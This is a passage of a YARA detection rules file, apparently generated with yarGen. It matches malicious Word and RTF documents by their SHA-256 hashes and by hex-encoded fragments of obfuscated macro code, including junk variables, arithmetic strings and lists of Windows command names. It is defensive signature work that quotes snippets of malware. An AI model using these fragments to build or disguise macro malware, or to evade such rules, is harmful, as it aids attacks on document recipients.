      $s2 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide
      $s3 = "unction " fullword ascii
      $s4 = "Module1b" fullword ascii
      $s5 = "Document=ThisDocumeP" fullword ascii
      $s6 = "nt/&H00000000" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_15 {
   meta:
      description = "DOC - from files 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "7573667963686B73203D2077736C617573667963686B73202B" ascii /* hex encoded string 'usfychks = wslausfychks +' */
      $s2 = "33343635342D333938333635362F3237343637353839363534" ascii /* hex encoded string '34654-3983656/27467589654' */
      $s3 = "3635342B3433343333372A34353633343533342A2833343633" ascii /* hex encoded string '654+434337*45634534*(3463' */
      $s4 = "202239333933393537333734332A33343336343633342B3536" ascii /* hex encoded string ' "93939573743*34364634+56' */
      $s5 = "673679787967627975363772666769626766626E667237203D" ascii /* hex encoded string 'g6yxygbyu67rfgibgfbnfr7 =' */
      $s6 = "667364663772656967203D206B6A7373647975667364663772" ascii /* hex encoded string 'fsdf7reig = kjssdyufsdf7r' */
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_16 {
   meta:
      description = "DOC - from files 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "202020202020202020202020697672656A6B203D2069767265" ascii /* hex encoded string '            ivrejk = ivre' */
      $s2 = "756C6B79746A747268746A726B647361726A6B79203D226257" ascii /* hex encoded string 'ulkytjtrhtjrkdsarjky ="bW' */
      $s3 = "{\\rtf\\Fbidi \\froman\\fcharset238\\ud1\\adeff31507\\deff0\\stshfdbch31506\\stshfloch31506\\ztahffick41c05\\stshfBi31507\\deEfl" ascii
      $s4 = "adeff31507" ascii
      $s5 = "{\\rtf\\Fbidi \\froman\\fcharset238\\ud1\\adeff31507\\deff0\\stshfdbch31506\\stshfloch31506\\ztahffick41c05\\stshfBi31507\\deEfl" ascii
      $s6 = "langfe1045\\themelang1045\\themelangfe1\\themelangcs5{\\lsdlockedexcept \\lsdqformat2 \\lsdpriority0 \\lsdlocked0 Normal;\\b865c" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_17 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "342D333938333635362F32373436373538393635343635342B" ascii /* hex encoded string '4-3983656/27467589654654+' */
      $s2 = "7967627975363772666769626766626E667237203D20223933" ascii /* hex encoded string 'ygbyu67rfgibgfbnfr7 = "93' */
      $s3 = "3933393537333734332A33343336343633342B353633343635" ascii /* hex encoded string '939573743*34364634+563465' */
      $s4 = "2020202020202020697672656A6B203D20697672656A6B202B" ascii /* hex encoded string '        ivrejk = ivrejk +' */
      $s5 = "3433343333372A34353633343533342A283334363337383533" ascii /* hex encoded string '434337*45634534*(34637853' */
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_18 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash3 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash4 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "2B3433343333372A34353633343533342A2833343633373835" ascii /* hex encoded string '+434337*45634534*(3463785' */
      $s2 = "787967627975363772666769626766626E667237203D202239" ascii /* hex encoded string 'xygbyu67rfgibgfbnfr7 = "9' */
      $s3 = "333933393537333734332A33343336343633342B3536333436" ascii /* hex encoded string '3939573743*34364634+56346' */
      $s4 = "35342D333938333635362F3237343637353839363534363534" ascii /* hex encoded string '54-3983656/27467589654654' */
      $s5 = "0D0A2020202074363736667474663735347662347866673679" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_19 {
   meta:
      description = "DOC - from files 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "43414C204654595045204D4B4C494E4B20504F504420505553" ascii /* hex encoded string 'CAL FTYPE MKLINK POPD PUS' */
      $s2 = "20202020203D20224153534F4320434F4C4F5220454E444C4F" ascii /* hex encoded string '     = "ASSOC COLOR ENDLO' */
      $s3 = "4B2043414C4C204344204348220D0A434F4E535420494E5445" ascii
      $s4 = "4844205345544C4F43414C205354415254205449544C45220D" ascii
      $s5 = "0A202020202020202020202020657865637574652822626161" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_20 {
   meta:
      description = "DOC - from files e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash3 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "393635343635342B3433343333372A34353633343533342A28" ascii /* hex encoded string '9654654+434337*45634534*(' */
      $s2 = "342B353633343635342D333938333635362F32373436373538" ascii /* hex encoded string '4+5634654-3983656/2746758' */
      $s3 = "7237203D202239333933393537333734332A33343336343633" ascii /* hex encoded string 'r7 = "93939573743*3436463' */
      $s4 = "62347866673679787967627975363772666769626766626E66" ascii /* hex encoded string 'b4xfg6yxygbyu67rfgibgfbnf' */
      $s5 = "3334363337383533342D333436333734292B3438333435220D" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_21 {
   meta:
      description = "DOC - from files e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "4D4F4E2020202020203D2022425245414B2043414C4C204344" ascii /* hex encoded string 'MON      = "BREAK CALL CD' */
      $s2 = "53534F4320434F4C4F5220454E444C4F43414C204654595045" ascii /* hex encoded string 'SSOC COLOR ENDLOCAL FTYPE' */
      $s3 = "204D4B4C494E4B20504F5044205055534844205345544C4F43" ascii /* hex encoded string ' MKLINK POPD PUSHD SETLOC' */
      $s4 = "414C205354415254205449544C45220D0A434F4E535420494E" ascii
      $s5 = "204348220D0A434F4E535420494E5445524E414C5F434D445F" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

